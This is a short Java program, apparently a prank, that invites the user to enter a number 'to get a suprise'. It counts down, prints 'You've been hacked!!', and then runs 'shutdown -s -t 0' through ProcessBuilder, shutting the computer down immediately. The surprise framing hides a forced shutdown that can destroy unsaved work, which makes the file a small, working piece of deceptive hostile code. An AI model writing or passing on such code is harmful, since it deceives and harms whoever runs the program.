import java.util.*;
public class Suprise{
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int nber;
        System.out.print("Enter a number to get a suprise: ");
        nber = scanner.nextInt();
        int i;
        for(i = nber; i > 0; i--){
            System.out.println(i);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                System.err.println("I was interrupted!");
                /* e.printStackTrace(); */
            }
        }
        System.out.println("You've been hacked!!");
        try {
            ProcessBuilder pb= new ProcessBuilder("shutdown","-s","-t","0");
            pb.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}






